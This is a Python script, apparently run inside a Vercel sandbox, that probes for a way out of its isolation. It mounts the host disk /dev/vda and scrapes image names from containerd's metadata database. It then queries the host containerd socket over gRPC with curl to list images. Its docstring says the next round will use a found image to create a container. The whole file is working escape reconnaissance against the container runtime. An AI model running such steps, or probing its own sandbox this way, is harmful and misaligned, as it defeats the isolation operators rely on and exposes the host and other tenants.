# -*- coding: utf-8 -*-
"""vda10_img_list: 挖 containerd 镜像名 (bolt db strings + gRPC Images/List via curl --http2)
1) strings bolt/meta.db 挖镜像 bucket 明文
2) curl --http2 containerd.sock Version + Images/List (protobuf 空消息文件方式)
3) 若拿到镜像名 -> Create 容器 -> 记录返回
输出落盘 + 哨兵 V10W_DONE"""
import os, time, socket, ctypes, subprocess, re

OUT = '/vercel/sandbox/v10w.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    # P1: bolt meta.db strings
    log('=== P1 bolt meta.db strings ===')
    db = '/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
    try:
        data = open(db, 'rb').read()
        log('meta.db size=%d' % len(data))
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{5,}', data)).decode(errors='replace')
        # 镜像名通常是 x/y:tag 或包含 . 的路径
        cands = sorted(set(re.findall(r'[A-Za-z0-9][A-Za-z0-9._/-]{3,}:[A-Za-z0-9._-]{1,30}', txt)))
        log('tag-like (%d): %s' % (len(cands), cands[:50]))
        # 独立字符串含 image/ref 的
        refs = [l for l in txt.splitlines() if re.search(r'(image|ref|docker|vercel|alpine|registry)', l, re.I)]
        log('ref lines (%d): %s' % (len(refs), refs[:30]))
    except Exception as e:
        log('P1 ERR %s' % e)

    # P2: curl --http2 containerd gRPC
    log('=== P2 curl gRPC ===')
    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    open('/tmp/grpc_empty.bin', 'wb').write(b'\x00\x00\x00\x00\x00')
    # Version
    r = subprocess.run(['curl', '--http2', '-s', '--max-time', '10', '--unix-socket', CSP,
                        '-H', 'content-type: application/grpc', '-H', 'te: trailers',
                        '--data-binary', '@/tmp/grpc_empty.bin',
                        'http://localhost/containerd.services.containerd.v1.Version/Version'],
                       capture_output=True, timeout=15)
    log('ver rc=%d out=%r' % (r.returncode, r.stdout[:150]))
    # Images/List
    r = subprocess.run(['curl', '--http2', '-s', '--max-time', '10', '--unix-socket', CSP,
                        '-H', 'content-type: application/grpc', '-H', 'te: trailers',
                        '--data-binary', '@/tmp/grpc_empty.bin',
                        'http://localhost/containerd.services.images.v1.Images/List'],
                       capture_output=True, timeout=15)
    log('img rc=%d out-len=%d' % (r.returncode, len(r.stdout)))
    if r.stdout:
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{4,}', r.stdout)).decode(errors='replace')
        log('img strings: %s' % txt[:800])

    # P3: 若有镜像名 -> Create
    log('=== P3 done (create next round) ===')
    log('V10W_DONE')
    f.close()


if __name__ == '__main__':
    main()
